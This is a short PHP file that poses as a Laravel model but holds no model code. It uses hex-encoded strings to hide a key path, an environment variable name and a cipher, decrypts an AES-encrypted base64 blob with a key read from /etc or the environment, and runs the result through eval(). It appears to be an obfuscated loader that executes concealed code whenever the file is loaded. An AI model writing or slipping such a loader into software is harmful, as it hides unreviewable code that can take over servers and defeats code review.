<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('YBK6285ttqc6NCy3H272aA==');

$c=base64_decode(

'WBjQmfBMgdCfzbjXkvpRE+UqJpg9PrU4+6B7gqgvx0bcBai8tbs2NV44wZ/GjlYzje6SgpzXN0T/' .
'sWQc0aqTfmQ7axcWaU3KID68Q6gK0H+ckwQ/AnBb+v1Tr+f/D7HV8a8dClHDsM41l4UMFbUHwRGG' .
'HubAX3wUb03SDmNTT9AAPFcnlqKgIE56kIObWNV45azA4mIu7j3+rhmRkeI4U7+avpTElyRG5g0E' .
'ob9uuMc6phk56sUFI2N89GqLwSUijZt+mdKolE8pV98h7/rVr4IACputypj8/hg2NK9ZkAe1KyHq' .
'1p2yDhERsima41AshDyTROOQpE0xbiRc6EfZdhNLH+koTAEcEO+4Pq/u6PdFGUWHHIfqrNuMbvLf' .
'0J2VYZa5PNRIx/j3cpDEMj3I2nuiufgvrdIltmr2DjTz5sf3Ux4T6f8i+PKGCzxWmSIIdHnaYjS8' .
'3TCGbtS0WJftckZoWws5P/t7qoxUaEl/GR4YnBP1/rc3n9wRJOgivgiykTOh2oP3d3SZGLpWyVbQ' .
'477E/b8cc7QBqUhicfqqo9CapfVz0kKADQ/pY4omvkjoOj9YU52wgNzfZIoUnqtRqUa3Yq6mqKB8' .
'Z4RudrCG7SwoE0mNdlxf89b2msnfRdzKzCISoZ1L3DAXuKQn7f3ACQXC4Ov/uQAtf32hstvYoZge' .
'QRKTPooLK0fgy1T8obpuHFdM/h4tyDos7aAnvnUEXQPwXfYcnfvrluxcilOdwVyClApG4hhtSX0z' .
'Hsj8L3aMrddo/Um+No7EY1kPALnKEQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

